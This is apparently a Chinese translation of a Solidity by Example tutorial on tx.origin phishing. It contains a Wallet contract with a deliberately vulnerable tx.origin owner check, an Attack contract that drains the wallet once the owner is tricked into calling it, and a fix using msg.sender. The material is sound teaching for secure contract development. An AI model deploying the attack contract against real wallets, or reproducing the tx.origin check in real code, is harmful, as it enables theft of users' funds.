# tx.origin 钓鱼

对应英文原页：https://solidity-by-example.org/hacks/phishing-with-tx-origin

## `msg.sender` 和 `tx.origin` 有什么区别？

如果合约 A 调用 B，B 再调用 C，那么在 C 中 `msg.sender` 是 B，`tx.origin` 是 A。

## 漏洞

恶意合约可以欺骗合约的 owner 去调用
一个本应只有 owner 才能调用的函数。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/*
Wallet 是一个简单合约，只有 owner 才能把
Ether 转到另一个地址。Wallet.transfer() 使用 tx.origin 来检查
调用者是否为 owner。让我们看看如何攻破这个合约
*/

/*
1. Alice 部署 Wallet 并放入 10 Ether
2. Eve 使用 Alice 的 Wallet 合约地址部署 Attack。
3. Eve 诱骗 Alice 调用 Attack.attack()
4. Eve 成功从 Alice 的钱包中偷走 Ether

发生了什么？
Alice 被诱骗调用了 Attack.attack()。在 Attack.attack() 内部，它
请求把 Alice 钱包中的全部资金转到 Eve 的地址。
由于 Wallet.transfer() 中的 tx.origin 等于 Alice 的地址，
转账被授权。钱包把全部 Ether 转给了 Eve。
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```

## 预防措施

使用 `msg.sender` 而不是 `tx.origin`

```solidity
function transfer(address payable _to, uint256 _amount) public {
    require(msg.sender == owner, "Not owner");

    (bool sent, ) = _to.call{ value: _amount }("");
    require(sent, "Failed to send Ether");
}
```

---
## 关注我们
[Yanbo的Twitter](https://x.com/Yanbo2004)｜[Web3Club的Twitter](https://twitter.com/Web3ClubCN)


[加入我们](https://github.com/Web3-Club/Intro./blob/main/Join%20club.md)
